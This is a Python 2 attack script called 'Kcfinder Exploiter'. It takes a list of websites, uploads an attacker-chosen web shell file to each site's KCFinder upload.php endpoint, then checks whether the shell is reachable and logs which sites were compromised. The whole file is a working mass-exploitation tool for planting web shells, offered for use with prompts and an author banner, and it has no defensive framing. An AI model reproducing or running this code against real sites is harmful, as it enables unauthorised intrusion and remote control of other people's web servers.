import requests
import re
from urlparse import urlparse, parse_qs
def sel(lis, shell, path, outlist):
	wordlist = open(lis, 'r')
	for site in wordlist.readlines():
		url = site.rstrip()
		if len(re.findall(r"http.*\:\/\/", url, re.M|re.I)) == 0:
			url = "http://" + url
		privat = urlparse(url).netloc
		print '\033[94mTrying Exploit Kcfinder\033[0m'
		print '\033[94m| '+privat+'\033[0m'
		target = 'http://'+privat+'/'+path+'/kcfinder/upload.php'
		files = {'Filedata': open(shell, 'rb')}
		try:
			vat = requests.post(target, files=files)
			cek = 'http://'+privat+'/'+path+'/kcfinder/upload/files/'+shell
			try:
				cat = requests.post(cek, timeout=20).status_code
			except:
				print("Skipped %s" % cek)
				continue
			success = "Failed"
			if cat == 200:
				# open(outlist, 'a').write()
				print '\033[92m| Status: Success Exploit\033[0m'
				print '\033[92m| Path Shell: /'+path+'/kcfinder/upload/files/'+shell+'\033[0m'
				success = "Success"
			else:
				print '\033[91m| Status: Failed Exploit\033[0m'
				print '\033[91m| Path Shell: No Value\033[0m'
			with open(outlist, 'a') as lnct:
				lnct.write("%s -> %s\n" % (privat, success))
				lnct.close()
		except KeyboardInterrupt:
			print ''; print '\033[91mCTRL + C: Tool Exploiter Stoped\033[0m'; exit()
		except Exception as e:
			print ''; print '\033[91mException thrown: %s\033[0m' % str(e); exit()


print '''\033[94m
+++++++++++++ | Github: http://github.com/theprivat
+ Kcfinder  + | Creator: thePriVat
+ Exploiter + | Contact: theprivat@khoirulrisqi.com
+++++++++++++ | Version: 1.0 Code: Python 2.7.10++
\033[0m'''
lis = raw_input('Wordlist site: ')
shell = raw_input('Shell: ')
path = raw_input('path: ')
outlist = raw_input('Output list: ')
print ''
sel(lis, shell, path, outlist)
